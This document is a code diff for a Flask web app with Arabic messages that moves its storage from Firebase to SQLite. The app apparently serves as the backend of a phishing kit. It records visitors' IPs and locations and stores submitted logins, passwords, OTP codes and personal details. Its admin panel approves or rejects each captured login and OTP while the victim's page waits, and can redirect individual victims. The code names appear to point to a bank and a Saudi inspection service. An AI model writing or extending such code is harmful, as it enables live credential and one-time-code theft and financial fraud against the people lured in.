@@ -3,7 +3,9 @@ import os
 import json
 import datetime
 import uuid
-import requests
+import time
+from flask_sqlalchemy import SQLAlchemy
+from sqlalchemy import Enum
 
 app = Flask(__name__)
 app.secret_key = os.environ.get("FLASK_SECRET_KEY", "super_secret_key_for_admin_panel")
@@ -11,103 +13,45 @@ app.secret_key = os.environ.get("FLASK_SECRET_KEY", "super_secret_key_for_admin_
 app.static_folder = os.path.join(os.path.dirname(__file__))
 app.template_folder = os.path.join(os.path.dirname(__file__))
 
-FIREBASE_DB_URL = "https://saso-inspection-default-rtdb.firebaseio.com"
+if os.environ.get("VERCEL"):
+    # Vercel serverless: read-only filesystem except /tmp
+    os.makedirs("/tmp", exist_ok=True)
+    app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:////tmp/db.sqlite"
+else:
+    app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///mashreq.db"
+app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
+db = SQLAlchemy(app)
 
-# ============ نماذج قاعدة البيانات (Firebase RTDB Wrapper) ============
+# ============ نماذج قاعدة البيانات ============
 
-class UserSession:
-    def __init__(self, data_dict):
-        self.id = data_dict.get('id')
-        self.session_id = data_dict.get('session_id')
-        self.ip_address = data_dict.get('ip_address')
-        self.country = data_dict.get('country')
-        self.current_page = data_dict.get('current_page')
-        la = data_dict.get('last_activity')
-        self.last_activity = datetime.datetime.fromisoformat(la) if la else datetime.datetime.now()
-        self.redirect_to = data_dict.get('redirect_to')
-        
-        reqs_data = data_dict.get('requests', {})
-        self.requests = [ClientRequest(rid, rval) for rid, rval in reqs_data.items() if isinstance(rval, dict)]
+class UserSession(db.Model):
+    __tablename__ = "users"
+    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
+    session_id = db.Column(db.String(255), unique=True, nullable=False)
+    ip_address = db.Column(db.String(45))
+    country = db.Column(db.String(255))
+    current_page = db.Column(db.String(255))
+    last_activity = db.Column(db.DateTime, default=datetime.datetime.now)
+    redirect_to = db.Column(db.String(255), nullable=True)
 
-    def save(self):
-        payload = {
-            "id": self.id,
-            "session_id": self.session_id,
-            "ip_address": self.ip_address,
-            "country": self.country,
-            "current_page": self.current_page,
-            "last_activity": self.last_activity.isoformat() if self.last_activity else None,
-            "redirect_to": self.redirect_to
-        }
-        requests.patch(f"{FIREBASE_DB_URL}/users/{self.id}.json", json=payload)
+    requests = db.relationship("ClientRequest", backref="user_session", lazy=True, cascade="all, delete-orphan")
 
-    @staticmethod
-    def query_filter_by_session_id(sid):
-        try:
-            res = requests.get(f"{FIREBASE_DB_URL}/users.json").json()
-            if not res or not isinstance(res, dict):
-                return None
-            for uid, val in res.items():
-                if isinstance(val, dict) and val.get('session_id') == sid:
-                    return UserSession(val)
-        except Exception:
-            pass
-        return None
-
-    @staticmethod
-    def query_all():
-        try:
-            res = requests.get(f"{FIREBASE_DB_URL}/users.json").json()
-            if not res or not isinstance(res, dict):
-                return []
-            return [UserSession(val) for val in res.values() if isinstance(val, dict)]
-        except Exception:
-            return []
-
-    @staticmethod
-    def query_get(uid):
-        try:
-            res = requests.get(f"{FIREBASE_DB_URL}/users/{uid}.json").json()
-            if not res or not isinstance(res, dict):
-                return None
-            return UserSession(res)
-        except Exception:
-            return None
+    def __repr__(self):
+        return f"<UserSession {self.session_id}>"
 
 
-class ClientRequest:
-    def __init__(self, req_id, data_dict):
-        self.id = req_id
-        self.user_id = data_dict.get('user_id')
-        self.type = data_dict.get('type')
-        self.data = data_dict.get('data')
-        self.status = data_dict.get('status', 'pending')
-        ts = data_dict.get('timestamp')
-        self.timestamp = datetime.datetime.fromisoformat(ts) if ts else datetime.datetime.now()
-        aat = data_dict.get('admin_action_time')
-        self.admin_action_time = datetime.datetime.fromisoformat(aat) if aat else None
+class ClientRequest(db.Model):
+    __tablename__ = "client_requests"
+    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
+    user_id = db.Column(db.String(36), db.ForeignKey("users.id"), nullable=False)
+    type = db.Column(db.String(50), nullable=False)  # login, otp, personal_info
+    data = db.Column(db.JSON, nullable=False)
+    status = db.Column(Enum("pending", "approved", "rejected", name="request_status"), default="pending")
+    timestamp = db.Column(db.DateTime, default=datetime.datetime.now)
+    admin_action_time = db.Column(db.DateTime)
 
-    def save(self):
-        payload = {
-            "user_id": self.user_id,
-            "type": self.type,
-            "data": self.data,
-            "status": self.status,
-            "timestamp": self.timestamp.isoformat() if self.timestamp else None,
-            "admin_action_time": self.admin_action_time.isoformat() if self.admin_action_time else None
-        }
-        requests.patch(f"{FIREBASE_DB_URL}/client_requests/{self.id}.json", json=payload)
-        requests.patch(f"{FIREBASE_DB_URL}/users/{self.user_id}/requests/{self.id}.json", json=payload)
-
-    @staticmethod
-    def query_get(req_id):
-        try:
-            res = requests.get(f"{FIREBASE_DB_URL}/client_requests/{req_id}.json").json()
-            if not res or not isinstance(res, dict):
-                return None
-            return ClientRequest(req_id, res)
-        except Exception:
-            return None
+    def __repr__(self):
+        return f"<ClientRequest {self.id} - {self.type} - {self.status}>"
 
 
 # ============ دوال مساعدة ============
@@ -121,21 +65,11 @@ def get_user_session_id():
 
 def get_or_create_user(current_page=""):
     sid = get_user_session_id()
-    user = UserSession.query_filter_by_session_id(sid)
+    user = UserSession.query.filter_by(session_id=sid).first()
     if not user:
-        user_id = str(uuid.uuid4())
-        user_data = {
-            "id": user_id,
-            "session_id": sid,
-            "ip_address": request.remote_addr,
-            "country": None,
-            "current_page": current_page,
-            "last_activity": datetime.datetime.now().isoformat(),
-            "redirect_to": None,
-            "requests": {}
-        }
-        requests.put(f"{FIREBASE_DB_URL}/users/{user_id}.json", json=user_data)
-        user = UserSession(user_data)
+        user = UserSession(session_id=sid, ip_address=request.remote_addr, current_page=current_page)
+        db.session.add(user)
+        db.session.commit()
     return user, sid
 
 
@@ -197,7 +131,7 @@ def get_all_requests():
     if not session.get("logged_in"):
         return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401
 
-    all_sessions = UserSession.query_all()
+    all_sessions = UserSession.query.all()
     sessions_list = []
 
     for user in all_sessions:
@@ -233,7 +167,7 @@ def get_request_details(session_id):
     if not session.get("logged_in"):
         return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401
 
-    user = UserSession.query_filter_by_session_id(session_id)
+    user = UserSession.query.filter_by(session_id=session_id).first()
     if not user:
         return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404
 
@@ -259,7 +193,7 @@ def get_request_details(session_id):
 def admin_approve_login(user_session_id):
     if not session.get("logged_in"):
         return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401
-    user = UserSession.query_filter_by_session_id(user_session_id)
+    user = UserSession.query.filter_by(session_id=user_session_id).first()
     if not user:
         return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404
     latest_login = None
@@ -270,7 +204,7 @@ def admin_approve_login(user_session_id):
     if latest_login:
         latest_login.status = "approved"
         latest_login.admin_action_time = datetime.datetime.now()
-        latest_login.save()
+    db.session.commit()
     return jsonify({"status": "success", "message": "تمت الموافقة على تسجيل الدخول"})
 
 
@@ -278,7 +212,7 @@ def admin_approve_login(user_session_id):
 def admin_reject_login(user_session_id):
     if not session.get("logged_in"):
         return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401
-    user = UserSession.query_filter_by_session_id(user_session_id)
+    user = UserSession.query.filter_by(session_id=user_session_id).first()
     if not user:
         return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404
     latest_login = None
@@ -289,7 +223,7 @@ def admin_reject_login(user_session_id):
     if latest_login:
         latest_login.status = "rejected"
         latest_login.admin_action_time = datetime.datetime.now()
-        latest_login.save()
+    db.session.commit()
     return jsonify({"status": "success", "message": "تم رفض تسجيل الدخول"})
 
 
@@ -298,7 +232,7 @@ def admin_reject_login(user_session_id):
 def admin_approve_otp(user_session_id):
     if not session.get("logged_in"):
         return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401
-    user = UserSession.query_filter_by_session_id(user_session_id)
+    user = UserSession.query.filter_by(session_id=user_session_id).first()
     if not user:
         return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404
     latest_otp = None
@@ -309,7 +243,7 @@ def admin_approve_otp(user_session_id):
     if latest_otp:
         latest_otp.status = "approved"
         latest_otp.admin_action_time = datetime.datetime.now()
-        latest_otp.save()
+    db.session.commit()
     return jsonify({"status": "success", "message": "تمت الموافقة على OTP"})
 
 
@@ -317,7 +251,7 @@ def admin_approve_otp(user_session_id):
 def admin_reject_otp(user_session_id):
     if not session.get("logged_in"):
         return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401
-    user = UserSession.query_filter_by_session_id(user_session_id)
+    user = UserSession.query.filter_by(session_id=user_session_id).first()
     if not user:
         return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404
     latest_otp = None
@@ -328,69 +262,57 @@ def admin_reject_otp(user_session_id):
     if latest_otp:
         latest_otp.status = "rejected"
         latest_otp.admin_action_time = datetime.datetime.now()
-        latest_otp.save()
+    db.session.commit()
     return jsonify({"status": "success", "message": "تم رفض OTP"})
 
 
 # ---- Submit Request ----
 @app.route("/submit_request", methods=["POST"])
 def submit_request():
-    if not request.is_json:
-        return jsonify({"status": "error", "message": "يجب أن يكون الطلب بصيغة JSON"}), 400
-    
-    req_json = request.get_json()
-    if not req_json:
-        return jsonify({"status": "error", "message": "بيانات الطلب فارغة"}), 400
+    if request.is_json:
+        data = request.get_json()
+        request_type = data.get("type")
+        user_data = data.get("data")
 
-    if "type" in req_json and "data" in req_json and isinstance(req_json.get("data"), dict):
-        request_type = req_json.get("type")
-        user_data = req_json.get("data")
-    else:
-        user_data = req_json
-        if "otp" in user_data or "otp_code" in user_data:
-            request_type = "otp"
-        elif "username" in user_data or "password" in user_data:
-            request_type = "login"
-        else:
-            request_type = "personal_info"
+        if not request_type or not user_data:
+            return jsonify({"status": "error", "message": "بيانات الطلب غير مكتملة"}), 400
 
-    try:
         user, sid = get_or_create_user(current_page=request_type)
         user.current_page = request_type
         user.last_activity = datetime.datetime.now()
         if not user.country:
             user.country = get_country_from_ip(user.ip_address)
-        user.save()
+        db.session.commit()
 
         auto_approve = request_type in ("personal_info", "watch_request")
         initial_status = "approved" if auto_approve else "pending"
 
-        req_id = str(uuid.uuid4())
-        new_req = ClientRequest(req_id, {
-            "user_id": user.id,
-            "type": request_type,
-            "data": user_data,
-            "status": initial_status,
-            "timestamp": datetime.datetime.now().isoformat(),
-            "admin_action_time": datetime.datetime.now().isoformat() if auto_approve else None
-        })
-        new_req.save()
+        new_req = ClientRequest(
+            user_id=user.id,
+            type=request_type,
+            data=user_data,
+            status=initial_status,
+            timestamp=datetime.datetime.now(),
+            admin_action_time=datetime.datetime.now() if auto_approve else None
+        )
+        db.session.add(new_req)
+        db.session.commit()
 
         resp_status = "approved" if auto_approve else "pending"
         resp_msg = "تم استلام البيانات" if auto_approve else "تم استلام طلبك، بانتظار موافقة المسؤول"
         response = make_response(jsonify({"status": resp_status, "request_id": new_req.id, "message": resp_msg}), 200 if auto_approve else 202)
-        response.set_cookie('user_session_id', sid, max_age=86400*30, path='/')
+        response.set_cookie('user_session_id', sid, max_age=86400*30)
         return response
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+    else:
+        return jsonify({"status": "error", "message": "يجب أن يكون الطلب بصيغة JSON"}), 400
 
 
 # ---- Request Status (for loading page polling) ----
 @app.route("/request_status/<request_id>", methods=["GET", "POST"])
 def get_request_status(request_id):
-    req = ClientRequest.query_get(request_id)
+    req = ClientRequest.query.get(request_id)
     if req:
-        user = UserSession.query_get(req.user_id)
+        user = UserSession.query.get(req.user_id)
         return jsonify({"status": req.status, "type": req.type, "data": req.data, "redirect_to": user.redirect_to if user else None})
     return jsonify({"status": "error", "message": "الطلب غير موجود"}), 404
 
@@ -409,10 +331,10 @@ def track_visit():
         user.last_activity = datetime.datetime.now()
         if not user.country:
             user.country = get_country_from_ip(user.ip_address)
-        user.save()
+        db.session.commit()
 
         response = make_response(jsonify({"status": "success", "message": "تم تحديث الزيارة"}))
-        response.set_cookie('user_session_id', sid, max_age=86400*30, path='/')
+        response.set_cookie('user_session_id', sid, max_age=86400*30)
         return response
     return jsonify({"status": "error", "message": "يجب أن يكون الطلب بصيغة JSON"}), 400
 
@@ -424,18 +346,17 @@ def get_active_visits():
         return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401
 
     five_minutes_ago = datetime.datetime.now() - datetime.timedelta(minutes=5)
-    all_users = UserSession.query_all()
+    active_users = UserSession.query.filter(UserSession.last_activity >= five_minutes_ago).all()
 
     visits_list = []
-    for user in all_users:
-        if user.last_activity and user.last_activity >= five_minutes_ago:
-            visits_list.append({
-                "session_id": user.session_id,
-                "ip_address": user.ip_address,
-                "country": user.country,
-                "current_page": user.current_page,
-                "last_activity": user.last_activity.isoformat()
-            })
+    for user in active_users:
+        visits_list.append({
+            "session_id": user.session_id,
+            "ip_address": user.ip_address,
+            "country": user.country,
+            "current_page": user.current_page,
+            "last_activity": user.last_activity.isoformat()
+        })
     return jsonify(visits_list)
 
 
@@ -451,13 +372,21 @@ def admin_redirect_user(user_session_id):
         if not target_page:
             return jsonify({"status": "error", "message": "الصفحة المستهدفة غير محددة"}), 400
 
-        user = UserSession.query_filter_by_session_id(user_session_id)
+        user = UserSession.query.filter_by(session_id=user_session_id).first()
         if user:
             user.redirect_to = target_page
-            user.save()
+            db.session.commit()
             return jsonify({"status": "success", "message": "تم تعيين إعادة التوجيه للمستخدم"})
         return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404
     return jsonify({"status": "error", "message": "يجب أن يكون الطلب بصيغة JSON"}), 400
+
+
+# ============ تهيئة قاعدة البيانات ============
+with app.app_context():
+    try:
+        db.create_all()
+    except Exception as e:
+        print(f"db init warning: {e}")
 
 
 if __name__ == "__main__":
